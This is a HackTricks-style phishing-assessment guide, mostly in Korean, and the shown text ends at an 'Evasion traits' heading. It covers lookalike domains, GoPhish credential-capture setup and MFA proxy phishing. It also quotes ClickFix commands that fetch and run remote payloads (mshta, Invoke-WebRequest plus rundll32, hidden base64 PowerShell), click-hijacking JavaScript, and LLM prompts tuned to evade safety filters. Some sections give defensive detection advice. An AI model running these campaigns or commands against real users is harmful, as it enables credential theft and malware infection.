# Phishing Methodology

{{#include ../../banners/hacktricks-training.md}}

## Methodology

1. 피해자 조사
1. **피해자 도메인**을 선택한다.
2. 피해자가 사용하는 **login portals**를 찾기 위해 기본적인 web enumeration을 수행하고, 어떤 것을 **impersonate**할지 **결정**한다.
3. **OSINT**를 사용해 이메일을 **찾는다**.
2. 환경 준비
1. phishing assessment에 사용할 **도메인을 구매**한다
2. 관련 email service 레코드(SPF, DMARC, DKIM, rDNS)를 **구성**한다
3. **gophish**로 VPS를 구성한다
3. 캠페인 준비
1. **email template**를 준비한다
2. credentials를 훔치기 위한 **web page**를 준비한다
4. 캠페인을 시작한다!

## 유사한 도메인 이름을 생성하거나 신뢰할 수 있는 도메인을 구매하기

### Domain Name Variation Techniques

- **Keyword**: 도메인 이름에 원본 도메인의 중요한 **keyword**가 **포함**된다(예: zelster.com-management.com).
- **hypened subdomain**: subdomain의 **dot를 hyphen으로** 바꾼다(예: www-zelster.com).
- **New TLD**: 같은 도메인이지만 **새 TLD**를 사용한다(예: zelster.org)
- **Homoglyph**: 도메인 이름의 한 글자를 비슷하게 생긴 **letters**로 **대체**한다(예: zelfser.com).


{{#ref}}
homograph-attacks.md
{{#endref}}
- **Transposition:** 도메인 이름 안의 두 글자를 **서로 바꾼다**(예: zelsetr.com).
- **Singularization/Pluralization**: 도메인 이름 끝에 “s”를 추가하거나 제거한다(예: zeltsers.com).
- **Omission**: 도메인 이름에서 한 글자를 **제거**한다(예: zelser.com).
- **Repetition:** 도메인 이름의 한 글자를 **반복**한다(예: zeltsser.com).
- **Replacement**: homoglyph와 비슷하지만 덜 stealthy하다. 도메인 이름의 한 글자를 대체하며, 원래 글자와 키보드상 가까운 글자로 바꿀 수도 있다(예, zektser.com).
- **Subdomained**: 도메인 이름 안에 **dot**를 넣는다(예: ze.lster.com).
- **Insertion**: 도메인 이름에 글자를 **삽입**한다(예: zerltser.com).
- **Missing dot**: TLD를 도메인 이름에 붙인다. (예: zelstercom.com)

**Automatic Tools**

- [**dnstwist**](https://github.com/elceef/dnstwist)
- [**urlcrazy**](https://github.com/urbanadventurer/urlcrazy)

**Websites**

- [https://dnstwist.it/](https://dnstwist.it)
- [https://dnstwister.report/](https://dnstwister.report)
- [https://www.internetmarketingninjas.com/tools/free-tools/domain-typo-generator/](https://www.internetmarketingninjas.com/tools/free-tools/domain-typo-generator/)

### Bitflipping

**bit**이 저장되거나 통신 중에 다양한 요인, 예를 들어 태양 플레어, 우주선, 하드웨어 오류로 인해 자동으로 뒤집힐 가능성이 **있다**.

이 개념을 **DNS requests**에 **적용**하면, **DNS server가 받은 도메인**이 처음 요청한 도메인과 같지 않을 수 있다.

예를 들어, "windows.com" 도메인의 단일 bit 수정은 이를 "windnws.com"으로 바꿀 수 있다.

공격자는 피해자의 도메인과 비슷한 여러 bit-flipping domain을 등록하여 이를 **악용**할 수 있다. 그들의 목적은 정상 사용자를 자신의 인프라로 리다이렉트하는 것이다.

자세한 내용은 [https://www.bleepingcomputer.com/news/security/hijacking-traffic-to-microsoft-s-windowscom-with-bitflipping/](https://www.bleepingcomputer.com/news/security/hijacking-traffic-to-microsoft-s-windowscom-with-bitflipping/)를 읽어라

### 신뢰할 수 있는 도메인 구매하기

[https://www.expireddomains.net/](https://www.expireddomains.net)에서 사용할 수 있는 만료 도메인을 찾을 수 있다.\
구매하려는 만료 도메인이 **이미 좋은 SEO**를 가지고 있는지 확인하려면 다음에서 어떻게 분류되는지 확인할 수 있다:

- [http://www.fortiguard.com/webfilter](http://www.fortiguard.com/webfilter)
- [https://urlfiltering.paloaltonetworks.com/query/](https://urlfiltering.paloaltonetworks.com/query/)

## 이메일 찾기

- [https://github.com/laramies/theHarvester](https://github.com/laramies/theHarvester) (100% free)
- [https://phonebook.cz/](https://phonebook.cz) (100% free)
- [https://maildb.io/](https://maildb.io)
- [https://hunter.io/](https://hunter.io)
- [https://anymailfinder.com/](https://anymailfinder.com)

더 많은 유효한 email 주소를 **찾거나** 이미 찾은 것들을 **검증**하려면 피해자의 smtp servers를 brute-force할 수 있는지 확인하면 된다. [이곳에서 email address를 검증/찾는 방법을 보라](../../network-services-pentesting/pentesting-smtp/index.html#username-bruteforce-enumeration).\
또한 사용자가 메일에 접근하기 위해 **어떤 web portal**을 사용한다면, 그것이 **username brute force**에 취약한지 확인하고 가능하다면 그 취약점을 악용하라.

## GoPhish 구성하기

### Installation

[https://github.com/gophish/gophish/releases/tag/v0.11.0](https://github.com/gophish/gophish/releases/tag/v0.11.0)에서 다운로드할 수 있다

다운로드해서 `/opt/gophish` 안에 압축을 풀고 `/opt/gophish/gophish`를 실행하라\
출력에서 port 3333의 admin user용 password를 받게 된다. 따라서 그 port에 접근해 해당 credentials를 사용하여 admin password를 변경하라. local:로 해당 port를 터널링해야 할 수도 있다
```bash
ssh -L 3333:127.0.0.1:3333 <user>@<ip>
```
### 구성

**TLS 인증서 구성**

이 단계 전에 **이미 사용할 도메인**을 **구매**해 두었어야 하며, 해당 도메인은 **gophish**를 구성하고 있는 **VPS의 IP**를 **가리키고** 있어야 합니다.
```bash
DOMAIN="<domain>"
wget https://dl.eff.org/certbot-auto
chmod +x certbot-auto
sudo apt install snapd
sudo snap install core
sudo snap refresh core
sudo apt-get remove certbot
sudo snap install --classic certbot
sudo ln -s /snap/bin/certbot /usr/bin/certbot
certbot certonly --standalone -d "$DOMAIN"
mkdir /opt/gophish/ssl_keys
cp "/etc/letsencrypt/live/$DOMAIN/privkey.pem" /opt/gophish/ssl_keys/key.pem
cp "/etc/letsencrypt/live/$DOMAIN/fullchain.pem" /opt/gophish/ssl_keys/key.crt​
```
**Mail configuration**

Start installing: `apt-get install postfix`

Then add the domain to the following files:

- **/etc/postfix/virtual_domains**
- **/etc/postfix/transport**
- **/etc/postfix/virtual_regexp**

**Change also the values of the following variables inside /etc/postfix/main.cf**

`myhostname = <domain>`\
`mydestination = $myhostname, <domain>, localhost.com, localhost`

Finally modify the files **`/etc/hostname`** and **`/etc/mailname`** to your domain name and **restart your VPS.**

Now, create a **DNS A record** of `mail.<domain>` pointing to the **ip address** of the VPS and a **DNS MX** record pointing to `mail.<domain>`

Now lets test to send an email:
```bash
apt install mailutils
echo "This is the body of the email" | mail -s "This is the subject line" test@email.com
```
**Gophish 구성**

gophish 실행을 중지하고 설정해 봅시다.\
`/opt/gophish/config.json`을 다음과 같이 수정하세요(https 사용에 주의):
```bash
{
"admin_server": {
"listen_url": "127.0.0.1:3333",
"use_tls": true,
"cert_path": "gophish_admin.crt",
"key_path": "gophish_admin.key"
},
"phish_server": {
"listen_url": "0.0.0.0:443",
"use_tls": true,
"cert_path": "/opt/gophish/ssl_keys/key.crt",
"key_path": "/opt/gophish/ssl_keys/key.pem"
},
"db_name": "sqlite3",
"db_path": "gophish.db",
"migrations_prefix": "db/db_",
"contact_address": "",
"logging": {
"filename": "",
"level": ""
}
}
```
**gophish service 구성**

gophish service를 생성하여 자동으로 시작되고 service로 관리될 수 있도록 하려면 다음 내용으로 `/etc/init.d/gophish` 파일을 생성할 수 있습니다:
```bash
#!/bin/bash
# /etc/init.d/gophish
# initialization file for stop/start of gophish application server
#
# chkconfig: - 64 36
# description: stops/starts gophish application server
# processname:gophish
# config:/opt/gophish/config.json
# From https://github.com/gophish/gophish/issues/586

# define script variables

processName=Gophish
process=gophish
appDirectory=/opt/gophish
logfile=/var/log/gophish/gophish.log
errfile=/var/log/gophish/gophish.error

start() {
echo 'Starting '${processName}'...'
cd ${appDirectory}
nohup ./$process >>$logfile 2>>$errfile &
sleep 1
}

stop() {
echo 'Stopping '${processName}'...'
pid=$(/bin/pidof ${process})
kill ${pid}
sleep 1
}

status() {
pid=$(/bin/pidof ${process})
if [["$pid" != ""| "$pid" != "" ]]; then
echo ${processName}' is running...'
else
echo ${processName}' is not running...'
fi
}

case $1 in
start|stop|status) "$1" ;;
esac
```
서비스 구성을 완료하고 다음으로 확인하세요:
```bash
mkdir /var/log/gophish
chmod +x /etc/init.d/gophish
update-rc.d gophish defaults
#Check the service
service gophish start
service gophish status
ss -l | grep "3333\|443"
service gophish stop
```
## 메일 서버 및 도메인 구성

### Wait & be legit

도메인이 오래될수록 spam으로 잡힐 가능성은 더 낮습니다. 그러므로 phishing assessment를 하기 전에 가능한 한 오래 기다려야 합니다(최소 1week). 또한 평판이 좋은 분야에 대한 페이지를 올리면 얻는 reputation이 더 좋아집니다.

1주일을 기다려야 하더라도, 지금 모든 구성을 끝낼 수 있습니다.

### Configure Reverse DNS (rDNS) record

VPS의 IP address가 도메인 이름으로 resolve되도록 rDNS (PTR) record를 설정합니다.

### Sender Policy Framework (SPF) Record

새 도메인에 대해 **SPF record를 반드시 configure해야 합니다**. SPF record가 무엇인지 모른다면 [**이 페이지를 읽으세요**](../../network-services-pentesting/pentesting-smtp/index.html#spf).

[https://www.spfwizard.net/](https://www.spfwizard.net)를 사용하여 SPF policy를 생성할 수 있습니다(VPS machine의 IP를 사용).

![phishing domain용 SPF record를 생성하기 위한 SPF Wizard form](<../../images/image (1037).png>)

이는 domain 내부의 TXT record에 설정해야 하는 content입니다:
```bash
v=spf1 mx a ip4:ip.ip.ip.ip ?all
```
### Domain-based Message Authentication, Reporting & Conformance (DMARC) Record

새 도메인에 대해 **DMARC record를 구성해야 합니다**. DMARC record가 무엇인지 모른다면 [**이 페이지를 읽어보세요**](../../network-services-pentesting/pentesting-smtp/index.html#dmarc).

호스트명 `_dmarc.<domain>`을 가리키는 새로운 DNS TXT record를 생성해야 하며, 내용은 다음과 같습니다:
```bash
v=DMARC1; p=none
```
### DomainKeys Identified Mail (DKIM)

새 도메인에 대해 DKIM을 **구성해야 합니다**. DMARC record가 무엇인지 모른다면 [**이 페이지를 읽어보세요**](../../network-services-pentesting/pentesting-smtp/index.html#dkim).

이 튜토리얼은 다음을 기반으로 합니다: [https://www.digitalocean.com/community/tutorials/how-to-install-and-configure-dkim-with-postfix-on-debian-wheezy](https://www.digitalocean.com/community/tutorials/how-to-install-and-configure-dkim-with-postfix-on-debian-wheezy)

> [!TIP]
> DKIM key가 생성하는 두 개의 B64 values를 연결해야 합니다:
>
> ```
> v=DKIM1; h=sha256; k=rsa; p=MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEA0wPibdqPtzYk81njjQCrChIcHzxOp8a1wjbsoNtka2X9QXCZs+iXkvw++QsWDtdYu3q0Ofnr0Yd/TmG/Y2bBGoEgeE+YTUG2aEgw8Xx42NLJq2D1pB2lRQPW4IxefROnXu5HfKSm7dyzML1gZ1U0pR5X4IZCH0wOPhIq326QjxJZm79E1nTh3xj" "Y9N/Dt3+fVnIbMupzXE216TdFuifKM6Tl6O/axNsbswMS1TH812euno8xRpsdXJzFlB9q3VbMkVWig4P538mHolGzudEBg563vv66U8D7uuzGYxYT4WS8NVm3QBMg0QKPWZaKp+bADLkOSB9J2nUpk4Aj9KB5swIDAQAB
> ```

### 이메일 구성 점수 테스트

[https://www.mail-tester.com/](https://www.mail-tester.com)를 사용하면 됩니다\
페이지에 접속해서 그들이 제공하는 주소로 이메일을 보내세요:
```bash
echo "This is the body of the email" | mail -s "This is the subject line" test-iimosa79z@srv1.mail-tester.com
```
또한 `check-auth@verifier.port25.com`로 이메일을 보내고 **응답을 읽어서** **이메일 설정을 확인할 수 있습니다** (이를 위해서는 **25** 포트를 **열고**, root로 이메일을 보냈다면 파일 _/var/mail/root_에서 응답을 확인해야 합니다).\
모든 테스트를 통과하는지 확인하세요:
```bash
==========================================================
Summary of Results
==========================================================
SPF check:          pass
DomainKeys check:   neutral
DKIM check:         pass
Sender-ID check:    pass
SpamAssassin check: ham
```
또한 **자신이 제어하는 Gmail로 메시지**를 보낼 수도 있으며, Gmail 받은편지함에서 **이메일의 헤더**를 확인하면 `Authentication-Results` 헤더 필드에 `dkim=pass`가 있어야 합니다.
```
Authentication-Results: mx.google.com;
spf=pass (google.com: domain of contact@example.com designates --- as permitted sender) smtp.mail=contact@example.com;
dkim=pass header.i=@example.com;
```
### ​Removing from Spamhouse Blacklist

The page [www.mail-tester.com](https://www.mail-tester.com) can indicate you if you your domain is being blocked by spamhouse. You can request your domain/IP to be removed at: ​[https://www.spamhaus.org/lookup/](https://www.spamhaus.org/lookup/)

### Removing from Microsoft Blacklist

​​You can request your domain/IP to be removed at [https://sender.office.com/](https://sender.office.com).

## Create & Launch GoPhish Campaign

### Sending Profile

- 발신자 프로필을 식별할 수 있는 **name**을 설정하세요
- 피싱 이메일을 어떤 계정에서 보낼지 결정하세요. Suggestions: _noreply, support, servicedesk, salesforce..._
- username과 password는 비워둘 수 있지만, **Ignore Certificate Errors**를 체크했는지 반드시 확인하세요

![Create & Launch GoPhish Campaign - Sending Profile: You can leave blank the username and password, but make sure to check the Ignore Certificate Errors](<../../images/image (253) (1) (2) (1) (1) (2) (2) (3) (3) (5) (3) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (10) (15) (2).png>)

> [!TIP]
> 모든 것이 정상 동작하는지 테스트하기 위해 "**Send Test Email**" 기능을 사용하는 것이 권장됩니다.\
> 테스트에서 블랙리스트에 오르는 것을 피하려면 **테스트 이메일을 10분 메일 주소로 보내는 것**을 권장합니다.

### Email Template

- 템플릿을 식별할 수 있는 **name**을 설정하세요
- 그런 다음 **subject**를 작성하세요 (이상한 내용 말고, 일반 이메일에서 볼 법한 내용이면 됩니다)
- "**Add Tracking Image**"를 체크했는지 확인하세요
- **email template**를 작성하세요 (다음 예시처럼 variables를 사용할 수 있습니다):
```html
<html>
<head>
<title></title>
</head>
<body>
<p class="MsoNormal"><span style="font-size:10.0pt;font-family:&quot;Verdana&quot;,sans-serif;color:black">Dear {{.FirstName}} {{.LastName}},</span></p>
<br />
Note: We require all user to login an a very suspicios page before the end of the week, thanks!<br />
<br />
Regards,</span></p>

WRITE HERE SOME SIGNATURE OF SOMEONE FROM THE COMPANY

<p>{{.Tracker}}</p>
</body>
</html>
```
Note that **이메일의 신뢰도를 높이기 위해서는**, 클라이언트의 이메일에서 가져온 서명을 사용하는 것이 좋습니다. 제안사항:

- **존재하지 않는 주소**로 이메일을 보내고 응답에 서명이 있는지 확인합니다.
- info@ex.com, press@ex.com, public@ex.com 같은 **공개 이메일**을 찾아 이메일을 보내고 응답을 기다립니다.
- **유효하게 발견된** 이메일에 연락을 시도하고 응답을 기다립니다

![Sending Profile - Email Template: Try to contact some valid discovered email and wait for the response](<../../images/image (80).png>)

> [!TIP]
> Email Template는 보낼 파일을 **첨부**하는 것도 허용합니다. 특별히 조작된 파일/문서를 사용해 NTLM challenge를 훔치고 싶다면 [이 페이지](../../windows-hardening/ntlm/places-to-steal-ntlm-creds.md)를 읽어보세요.

### Landing Page

- **이름을 작성**합니다
- 웹 페이지의 **HTML 코드를 작성**합니다. 웹 페이지를 **import**할 수 있다는 점에 주의하세요.
- **Capture Submitted Data**와 **Capture Passwords**를 표시합니다
- **redirection**을 설정합니다

![Email Template - Landing Page: Mark Capture Submitted Data and Capture Passwords](<../../images/image (826).png>)

> [!TIP]
> 보통 페이지의 HTML 코드를 수정하고 로컬에서(아마 Apache 서버를 사용해) 테스트를 해보며 **결과가 마음에 들 때까지** 조정해야 합니다. 그런 다음 그 HTML 코드를 상자에 작성하세요.\
> HTML에 **정적 리소스**(예: 일부 CSS 및 JS 페이지)를 사용해야 한다면 _**/opt/gophish/static/endpoint**_에 저장한 뒤 _**/static/\<filename>**_에서 접근할 수 있습니다.

> [!TIP]
> redirection의 경우 피해자의 **정상 메인 웹 페이지로 리다이렉트**하거나, 예를 들어 _/static/migration.html_로 리다이렉트할 수 있습니다. 그리고 5초 동안 **spinning wheel (**[**https://loading.io/**](https://loading.io)**) 을 표시한 뒤 프로세스가 성공했다고 알리면 됩니다**.

### Users & Groups

- 이름을 설정합니다
- **데이터를 가져옵니다**(예제 템플릿을 사용하려면 각 사용자에 대해 firstname, last name, email address가 필요합니다)

![Landing Page - Users & Groups: Import the data (note that in order to use the template for the example you need the firstname, last name and email address of each user)](<../../images/image (163).png>)

### Campaign

마지막으로 이름, email template, landing page, URL, sending profile, group을 선택해 campaign을 생성합니다. URL은 피해자에게 전송될 링크라는 점에 주의하세요

**Sending Profile로 테스트 이메일을 보내 최종 phishing email이 어떻게 보일지 확인할 수 있습니다**는 점에 주의하세요:

![Users & Groups - Campaign: Note that the Sending Profile allow to send a test email to see how will the final phishing email looks like](<../../images/image (192).png>)

> [!TIP]
> 테스트 이메일은 블랙리스트 등록을 피하기 위해 10min mail 주소로 보내는 것을 권장합니다.

모든 준비가 끝나면, campaign을 시작하면 됩니다!

## Website Cloning

어떤 이유로든 웹사이트를 복제하고 싶다면 다음 페이지를 확인하세요:


{{#ref}}
clone-a-website.md
{{#endref}}

## Backdoored Documents & Files

일부 phishing 평가(주로 Red Teams)에서는 **어떤 종류의 backdoor가 포함된 파일도 전송**하고 싶을 수 있습니다(아마 C2이거나, 단순히 인증을 유발하는 것일 수도 있습니다).\
예시는 다음 페이지를 확인하세요:


{{#ref}}
phishing-documents.md
{{#endref}}

## Phishing MFA

### Via Proxy MitM

이전 공격은 실제 웹사이트를 가장하고 사용자가 입력한 정보를 수집한다는 점에서 매우 영리합니다. 하지만 사용자가 올바른 password를 입력하지 않았거나, 속인 애플리케이션이 2FA로 구성되어 있다면, **이 정보만으로는 속은 사용자를 가장할 수 없습니다**.

이때 [**evilginx2**](https://github.com/kgretzky/evilginx2)**,** [**CredSniper**](https://github.com/ustayready/CredSniper), [**muraena**](https://github.com/muraenateam/muraena) 같은 도구가 유용합니다. 이 도구를 사용하면 MitM 같은 공격을 생성할 수 있습니다. 기본적으로 공격은 다음과 같이 동작합니다:

1. 실제 웹페이지의 **login** form을 **가장**합니다.
2. 사용자가 자신의 **credentials**를 가짜 페이지에 **전송**하면, 도구가 그것을 실제 웹페이지로 보내 **credentials가 동작하는지 확인**합니다.
3. 계정이 **2FA**로 구성되어 있으면, MitM 페이지가 이를 요청하고 사용자가 그것을 **입력**하면 도구가 이를 실제 웹페이지로 보냅니다.
4. 사용자가 인증되면, 공격자인 당신은 도구가 MitM을 수행하는 동안의 모든 상호작용에서 **credentials, 2FA, cookie 및 모든 정보**를 캡처하게 됩니다.

### Via VNC

원래와 같은 외형의 악성 페이지로 피해자를 **보내는 대신**, 실제 웹페이지에 연결된 브라우저가 있는 **VNC session**으로 보내면 어떨까요? 그가 하는 일을 볼 수 있고, password, 사용된 MFA, cookie 등을 훔칠 수 있습니다...\
[**EvilnVNC**](https://github.com/JoelGMSec/EvilnoVNC)로 이것을 할 수 있습니다.

## Detecting the detection

당연히 차단되었는지 알아보는 가장 좋은 방법 중 하나는 **블랙리스트에서 자신의 domain을 검색**하는 것입니다. 목록에 있으면 어떤 식으로든 해당 domain이 의심스러운 것으로 탐지된 것입니다.\
domain이 어떤 blacklist에 표시되는지 확인하는 쉬운 방법은 [https://malwareworld.com/](https://malwareworld.com)를 사용하는 것입니다.

하지만, 피해자가 **현장에서 의심스러운 phishing activity를 적극적으로 찾고 있는지** 알아내는 다른 방법도 있으며, 이는 다음에서 설명됩니다:


{{#ref}}
detecting-phising.md
{{#endref}}

피해자의 domain과 **매우 비슷한 이름의 domain을 구매**하거나, 자신이 관리하는 domain의 **subdomain**에 대해 **certificate를 생성**하고 그 안에 피해자 domain의 **keyword**를 포함시킬 수 있습니다. 피해자가 이들과 어떤 종류의 **DNS 또는 HTTP 상호작용**이라도 하면, 그가 의심스러운 domain을 적극적으로 찾고 있다는 것을 알 수 있으며, 매우 stealth하게 행동해야 합니다.

### Evaluate the phishing

[**Phishious** ](https://github.com/Rices/Phishious)를 사용해 이메일이 spam folder로 들어갈지, 차단될지, 성공할지를 평가하세요.

## High-Touch Identity Compromise (Help-Desk MFA Reset)

현대의 침투 세트는 이메일 미끼를 완전히 건너뛰고 **직접 service-desk / identity-recovery workflow를 노려** MFA를 우회하는 경우가 점점 늘고 있습니다. 이 공격은 완전히 "living-off-the-land" 방식입니다: 운영자가 유효한 credentials를 확보하면 내장 관리 도구로 이동하며 – malware는 필요하지 않습니다.

### Attack flow
1. 피해자에 대해 recon 수행
* LinkedIn, data breaches, public GitHub 등에서 개인 및 회사 정보를 수집합니다.
* 고가치 identity(임원, IT, 재무)를 식별하고 password / MFA reset을 위한 **정확한 help-desk process**를 파악합니다.
2. 실시간 social engineering
* 대상인 척하여 전화, Teams 또는 chat으로 help-desk에 접근합니다(종종 **spoofed caller-ID** 또는 **cloned voice** 사용).
* 이전에 수집한 PII를 제공해 knowledge-based verification을 통과합니다.
* 상담원을 설득해 **MFA secret을 reset**하거나 등록된 모바일 번호에 **SIM-swap**을 수행하게 합니다.
3. 즉시 post-access 작업(실제 사례에서는 ≤60분)
* web SSO portal을 통해 foothold를 확보합니다.
* 내장 도구만 사용해 AD / AzureAD를 열거합니다(바이너리 drop 없음):
```powershell
# list directory groups & privileged roles
Get-ADGroup -Filter * -Properties Members | ?{$_.Members -match $env:USERNAME}

# AzureAD / Graph – list directory roles
Get-MgDirectoryRole | ft DisplayName,Id

# Enumerate devices the account can login to
Get-MgUserRegisteredDevice -UserId <user@corp.local>
```
* **WMI**, **PsExec**, 또는 환경에서 이미 허용 목록에 있는 합법적인 **RMM** agent를 사용해 lateral movement를 수행합니다.

### Detection & Mitigation
* help-desk identity recovery를 **privileged operation**으로 취급합니다 – step-up auth 및 manager approval을 요구하세요.
* 다음 항목을 경고하는 **Identity Threat Detection & Response (ITDR)** / **UEBA** 규칙을 배포하세요:
* MFA method 변경 후 새 device / geo에서 인증 발생.
* 동일 principal의 즉시 elevation(user-→-admin).
* help-desk 통화를 기록하고, 어떤 reset 전에라도 **이미 등록된 번호로 callback**하도록 강제하세요.
* **Just-In-Time (JIT) / Privileged Access**를 구현해 새로 reset된 계정이 고권한 token을 자동으로 상속하지 않게 하세요.

---

## At-Scale Deception – SEO Poisoning & “ClickFix” Campaigns
Commodity crew는 대규모 공격으로 고접촉 운영 비용을 상쇄하며 **search engines & ad networks를 전송 채널로 바꿉니다**.

1. **SEO poisoning / malvertising**이 `chromium-update[.]site` 같은 가짜 결과를 검색 광고 상단에 노출시킵니다.
2. 피해자는 작은 **first-stage loader**(보통 JS/HTA/ISO)를 다운로드합니다. Unit 42가 관찰한 예:
* `RedLine stealer`
* `Lumma stealer`
* `Lampion Trojan`
3. loader는 browser cookies + credential DB를 유출한 뒤 **silent loader**를 가져오고, 이 loader는 *실시간으로* 다음 중 무엇을 배포할지 결정합니다:
* RAT (예: AsyncRAT, RustDesk)
* ransomware / wiper
* persistence component (registry Run key + scheduled task)

### Hardening tips
* 새로 등록된 domain을 차단하고, e-mail뿐 아니라 *search-ads*에도 **Advanced DNS / URL Filtering**을 적용하세요.
* 소프트웨어 설치를 서명된 MSI / Store package로 제한하고, 정책으로 `HTA`, `ISO`, `VBS` 실행을 거부하세요.
* browser의 자식 프로세스가 installer를 여는지 모니터링하세요:
```yaml
- parent_image: /Program Files/Google/Chrome/*
and child_image: *\\*.exe
```
* first-stage loader가 자주 악용하는 LOLBins(예: `regsvr32`, `curl`, `mshta`)을 탐지하세요.

### Download-button click hijacking with TDS handoff
일부 가짜 software portal은 보이는 download `href`를 **실제** GitHub/release URL로 유지하지만, JavaScript에서 **첫 번째** 사용자 상호작용을 가로채 피해자를 대신 **Traffic Distribution System (TDS)** 체인으로 보냅니다.
```javascript
const cachedOpen = window.open;
document.addEventListener(isChromeDesktop() ? "mousedown" : "click", (e) => {
if (!isEligibleClick(e.target)) return;
cachedOpen(generateRuntimeURL({referrer: location.href, userDestination: extractClickedLink(e.target)}));
e.stopImmediatePropagation();
e.preventDefault();
}, true);
```
Key traits:
- 훅은 보통 `document`에서 **capture phase** (`true`)로 실행되므로, 사이트 핸들러보다 먼저 동작한다.
- Chrome은 종종 리다이렉트를 유효한 **user gesture**에 묶고 popup-blocker 우회를 개선하기 위해 `click` 대신 `mousedown`을 사용한다.
- 일부 변형은 미리 `about:blank`를 열거나 `<a target="_blank">` 클릭을 합성한 뒤, 나중에 TDS URL을 할당한다.
- Browser-side 제한은 흔히 `localStorage`에 저장되므로, **first click**은 malware까지 도달할 수 있지만 새로고침/재시도는 benign-looking visible link로 되돌아갈 수 있다.
- TDS는 referrer, entry domain, GEO, browser/device fingerprint, VPN/datacenter checks, click context, per-session counters로 분기할 수 있어, analyst replay가 비결정적일 수 있다.

Defender ideas:
- 표시된 `href`와 클릭 시점에 생성되는 **actual** navigation target을 비교한다.
- `window.open`, `about:blank`, 또는 synthetic anchor clicks 주변에서 `preventDefault()`와 `stopImmediatePropagation()`를 모두 호출하는 `document.addEventListener(..., true)` 핸들러를 찾는다.
- 새로 등록된 software-download domains 중 동일한 CloudFront/JS stage를 모두 로드하는 클러스터는 high-signal SEO-poisoning/TDS 패턴으로 취급한다.

### ClickFix from fake verification pages + archive-looking LOLBAS fetches
Some TDS branches end in a fake verification page (Cloudflare/IUAM style) that tells the victim to run a trusted Windows binary such as:
```cmd
C:\Windows\SysWOW64\mshta.exe https://example[.]com/navy.7z
```
Notes:
- `mshta.exe`는 URL이 `.7z` 아카이브인 것처럼 보이더라도 응답 **시작 부분의 HTA/VBScript를 실행**하며, 뒤에 붙는 아카이브 데이터는 순수한 미끼일 수 있다.
- 후속 단계는 종종 파일 형식에 대해 계속 거짓말을 하고 (`PowerShell`용 `.rtf`, `Python`용 `.asar`, 패딩된 바이너리가 들어간 ZIP 등), 이후 **manual PE mapping / in-memory execution**으로 전환한다.
- 이런 체인 중 하나에 대응하는 경우, **첫 번째 성공 실행의 network + memory를 보존**하라: 이후 재생은 benign installer/SFX 경로만 보이거나, payload/key release가 원래 TDS session에 묶여 있어 실패할 수 있다.

### ClickFix DLL delivery tradecraft (fake CERT update)
* Lure: 복제된 국가 CERT advisory에 **Update** 버튼이 있으며, 단계별 “fix” instructions를 보여준다. 피해자에게 DLL을 다운로드해 `rundll32`로 실행하는 batch를 돌리라고 지시한다.
* Typical batch chain observed:
```cmd
echo powershell -Command "Invoke-WebRequest -Uri 'https://example[.]org/notepad2.dll' -OutFile '%TEMP%\notepad2.dll'"
echo timeout /t 10
echo rundll32.exe "%TEMP%\notepad2.dll",notepad
```
* `Invoke-WebRequest`는 payload를 `%TEMP%`에 저장하고, 짧은 sleep은 network jitter를 숨기며, 그다음 `rundll32`가 exported entrypoint (`notepad`)를 호출한다.
* DLL은 host identity를 beaconing하고 몇 분마다 C2를 polling한다. Remote tasking은 hidden 상태에서 `policy bypass`와 함께 실행되는 **base64-encoded PowerShell**로 전달된다:
```powershell
powershell.exe -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -Command "[System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('<b64_task>')) | Invoke-Expression"
```
* 이는 C2의 유연성을 유지하고(server가 DLL을 업데이트하지 않고도 task를 교체 가능), console window를 숨긴다. `-WindowStyle Hidden` + `FromBase64String` + `Invoke-Expression`를 함께 사용하는 `rundll32.exe`의 PowerShell child를 찾아라.
* Defenders는 DLL load 후 `...page.php?tynor=<COMPUTER>sss<USER>` 형태의 HTTP(S) callback과 5분 polling interval을 찾을 수 있다.

---

## AI-Enhanced Phishing Operations
공격자들은 이제 **LLM & voice-clone APIs**를 연결해 완전히 personalized된 lures와 실시간 상호작용을 수행한다.

| Layer | 예시 사용 방식 by threat actor |
|-------|-----------------------------|
|Automation|랜덤화된 wording과 tracking links를 사용해 >100 k emails / SMS를 생성 및 전송.|
|Generative AI|공개 M&A, 소셜 미디어의 내부 농담을 언급하는 *one-off* emails 생성; callback scam에서 CEO voice deep-fake 사용.|
|Agentic AI|피해자가 클릭했지만 creds를 제출하지 않으면, domains를 자율적으로 등록하고, open-source intel을 스크래핑하며, 다음 단계 mails를 제작.|

**Defence:**
• **dynamic banners**를 추가해 신뢰되지 않은 automation에서 전송된 메시지를 강조 표시(ARC/DKIM anomalies를 통해).
• 고위험 전화 요청에는 **voice-biometric challenge phrases**를 배포.
• awareness programmes에서 AI-generated lures를 지속적으로 시뮬레이션하라 – static templates는 이제 obsolete하다.

See also – credential phishing을 위한 agentic browsing abuse:

{{#ref}}
ai-agent-mode-phishing-abusing-hosted-agent-browsers.md
{{#endref}}

See also – secrets inventory와 detection을 위한 local CLI tools 및 MCP에 대한 AI agent abuse:

{{#ref}}
ai-agent-abuse-local-ai-cli-tools-and-mcp.md
{{#endref}}

## LLM-assisted runtime assembly of phishing JavaScript (in-browser codegen)

공격자들은 무해해 보이는 HTML을 배포하고, **trusted LLM API**에 JavaScript를 요청해 **runtime에 stealer를 생성**한 뒤, 이를 브라우저 내에서 실행할 수 있다(예: `eval` 또는 dynamic `<script>`).

1. **Prompt-as-obfuscation:** prompt에 exfil URLs/Base64 strings를 인코딩하고, 안전 필터를 우회하고 hallucinations를 줄이기 위해 wording을 반복 조정한다.
2. **Client-side API call:** load 시 JS가 public LLM (Gemini/DeepSeek/etc.) 또는 CDN proxy를 호출한다. static HTML에는 prompt/API call만 존재한다.
3. **Assemble & exec:** response를 이어 붙여 실행한다(visit마다 polymorphic):
```javascript
fetch("https://llm.example/v1/chat",{method:"POST",body:JSON.stringify({messages:[{role:"user",content:promptText}]}),headers:{"Content-Type":"application/json",Authorization:`Bearer ${apiKey}`}})
.then(r=>r.json())
.then(j=>{const payload=j.choices?.[0]?.message?.content; eval(payload);});
```
4. **Phish/exfil:** 생성된 code는 lure를 개인화하고(e.g., LogoKit token parsing) creds를 prompt-hidden endpoint로 전송한다.

**Evasion traits**
